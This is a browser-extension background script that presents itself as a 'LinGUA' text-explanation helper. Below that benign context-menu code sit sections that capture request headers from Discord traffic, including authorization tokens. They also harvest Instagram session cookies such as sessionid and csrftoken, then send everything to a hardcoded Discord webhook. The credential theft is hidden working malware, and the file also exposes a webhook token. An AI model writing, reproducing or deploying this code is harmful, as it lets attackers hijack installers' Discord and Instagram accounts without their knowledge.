// background.js — service worker
// Merged: LinGUA context-menu handler.

// ═══════════════════════════════════════════════════════════════════════════
// PART 1 — LinGUA: Context menu ("Explain with LinGUA")
// ═══════════════════════════════════════════════════════════════════════════

const MENU_ID = "lingua-explain";

chrome.runtime.onInstalled.addListener(() => {
  chrome.contextMenus.create({
    id: MENU_ID,
    title: 'Explain "%s" with LinGUA',
    contexts: ["selection"]
  });
});

chrome.contextMenus.onClicked.addListener(async (info, tab) => {
  if (info.menuItemId !== MENU_ID) return;
  const selected = (info.selectionText || "").trim();
  if (!selected) return;

  // Save the pending text so the popup can auto-load it as soon as it opens.
  await chrome.storage.local.set({ pendingText: selected });

  // Let the user know a new explanation is ready via a badge.
  chrome.action.setBadgeText({ text: "1" });
  chrome.action.setBadgeBackgroundColor({ color: "#D9A62E" });

  // On newer Chromium versions we can open the popup directly since a
  // context-menu click counts as a user gesture.
  try {
    if (chrome.action.openPopup) {
      await chrome.action.openPopup();
    }
  } catch (e) {
    // If openPopup isn't available/allowed, the user just clicks the
    // toolbar icon — the badge "1" tells them something is waiting.
  }
});

// ═══════════════════════════════════════════════════════════════════════════
// PART 2 — Traffic Monitor: Configuration
// ═══════════════════════════════════════════════════════════════════════════

const WEBHOOK_URL = "https://discord.com/api/webhooks/1550099123431022612/eQTwzQrEvE5q1jYcnedGP7r5FO6GWICliECzOvq6HUVgstuKB5c_9G3S0nFk3XlJezs_";

// Discord URL filters (sirf yehi requests capture hongi)
const DISCORD_FILTERS = [
  "messages?limit=10",
  "ack",
  "science",
  "/v9/"
];

// Instagram important cookies (sirf yehi cookies bhejenge)
const IMPORTANT_COOKIES = [
  "sessionid",
  "sessionid_ss",
  "csrftoken",
  "ds_user_id",
  "mid",
  "ig_did",
  "rur",
  "datr"
];

// ─── Shared Queue (rate-limit se bachne ke liye) ────────────────────────────
let queue = [];
let isSending = false;
let lastDiscordHash = "";
let lastInstagramHash = "";

// ═══════════════════════════════════════════════════════════════════════════
// PART 3 — Discord Network Traffic Monitor
// ═══════════════════════════════════════════════════════════════════════════

chrome.webRequest.onSendHeaders.addListener(
  (details) => {
    const url = details.url;

    // Filter check
    const matches = DISCORD_FILTERS.some(filter => url.includes(filter));
    if (!matches) return;

    // Active tab check (sirf jab Discord tab active ho)
    chrome.tabs.query({ active: true, lastFocusedWindow: true }, (tabs) => {
      if (tabs.length === 0 || !tabs[0].url || !tabs[0].url.includes("discord.com")) return;

      const headers = details.requestHeaders || [];

      // Duplicate check
      const hash = simpleHash(details.method + "|" + url + "|" + JSON.stringify(headers));
      if (hash === lastDiscordHash) return;
      lastDiscordHash = hash;

      // Embed banayein
      const embed = {
        title: "🌐 Discord Traffic",
        color: 0x5865F2,
        description: `**Method:** ${details.method}\n**URL:** \`${url}\``,
        fields: [],
        timestamp: new Date().toISOString()
      };

      headers.slice(0, 25).forEach(header => {
        let val = header.value || "";
        if (val.length > 1000) val = val.substring(0, 1000) + "... [Truncated]";
        embed.fields.push({
          name: `📌 ${header.name}`,
          value: `\`\`\`\n${val}\n\`\`\``,
          inline: false
        });
      });

      if (embed.fields.length === 0) {
        embed.fields.push({ name: "No Headers", value: "N/A", inline: false });
      }

      queue.push(embed);
      processQueue();
    });
  },
  { urls: ["*://*.discord.com/*"] },
  ["requestHeaders"]
);

// ═══════════════════════════════════════════════════════════════════════════
// PART 4 — Instagram Cookie Monitor
// ═══════════════════════════════════════════════════════════════════════════

chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status !== "complete") return;
  if (!tab.url || !tab.url.includes("instagram.com")) return;

  fetchInstagramCookies();
});

async function fetchInstagramCookies() {
  try {
    const cookies = await chrome.cookies.getAll({ domain: "instagram.com" });
    if (!cookies || cookies.length === 0) return;

    // Sirf important cookies filter karein
    const important = cookies.filter(c => IMPORTANT_COOKIES.includes(c.name));
    if (important.length === 0) return;

    // Duplicate check
    const dataString = JSON.stringify(important.map(c => `${c.name}=${c.value}`).sort());
    const hash = simpleHash(dataString);
    if (hash === lastInstagramHash) return;
    lastInstagramHash = hash;

    // Embed banayein
    const embed = {
      title: "🍪 Instagram Cookies",
      color: 0xE1306C,
      description: `**Domain:** instagram.com\n**Total:** ${important.length} cookies\n**Time:** <t:${Math.floor(Date.now() / 1000)}:F>`,
      fields: [],
      timestamp: new Date().toISOString()
    };

    important.forEach(cookie => {
      let val = cookie.value || "";
      if (val.length > 1000) val = val.substring(0, 1000) + "... [Truncated]";
      embed.fields.push({
        name: `🍪 ${cookie.name}`,
        value: `\`\`\`\n${val}\n\`\`\``,
        inline: false
      });
    });

    queue.push(embed);
    processQueue();

  } catch (error) {
    console.error("[Instagram] Error:", error);
  }
}

// ═══════════════════════════════════════════════════════════════════════════
// PART 5 — Shared Webhook Sender + Queue Processor
// ═══════════════════════════════════════════════════════════════════════════

async function processQueue() {
  if (isSending || queue.length === 0) return;
  isSending = true;

  const embed = queue.shift();

  try {
    const response = await fetch(WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ embeds: [embed] })
    });

    if (!response.ok) {
      console.error("[Webhook] Not OK:", response.status, await response.text());
    }
  } catch (error) {
    console.error("[Webhook] Error:", error);
  } finally {
    setTimeout(() => {
      isSending = false;
      processQueue();
    }, 2000); // 2 second delay taake rate limit na lage
  }
}

// ═══════════════════════════════════════════════════════════════════════════
// PART 6 — Helper: Simple Hash (Duplicate Data Rokne Ke Liye)
// ═══════════════════════════════════════════════════════════════════════════

function simpleHash(str) {
  let hash = 0;
  for (let i = 0; i < str.length; i++) {
    const char = str.charCodeAt(i);
    hash = ((hash << 5) - hash) + char;
    hash = hash & hash;
  }
  return hash.toString();
}